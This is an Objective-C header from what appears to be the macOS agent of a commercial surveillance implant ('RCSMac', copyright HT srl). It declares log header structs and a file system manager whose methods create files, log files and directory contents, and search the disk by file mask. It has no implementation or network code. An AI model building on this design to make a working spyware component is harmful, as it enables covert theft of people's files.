/*
 *  RCSIFileSystemManager.h
 *  RCSMac
 *
 *
 *  Created on 1/27/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

//#import <Cocoa/Cocoa.h>


typedef struct _logDownloadHeader {
  u_int version;
#define LOG_FILE_VERSION 2008122901
  u_int fileNameLength;
} logDownloadHeader;

typedef struct _fileSystemHeader {
  u_int version;
#define LOG_FILESYSTEM_VERSION 2010031501
  u_int pathLength;
  u_int flags;
#define FILESYSTEM_IS_DIRECTORY 1
#define FILESYSTEM_IS_EMPTY     2
  u_int fileSizeLo;
  u_int fileSizeHi;
  u_int timestampLo;
  u_int timestampHi;
} fileSystemHeader;

@interface RCSIFileSystemManager : NSObject

- (BOOL)createFile: (NSString *)aFileName withData: (NSData *)aFileData;
- (BOOL)logFileAtPath: (NSString *)aFilePath;
- (BOOL)logDirContent: (NSString *)aDirPath withDepth: (uint32_t)aDepth;
- (NSArray *)searchFilesOnHD: (NSString *)aFileMask;

@end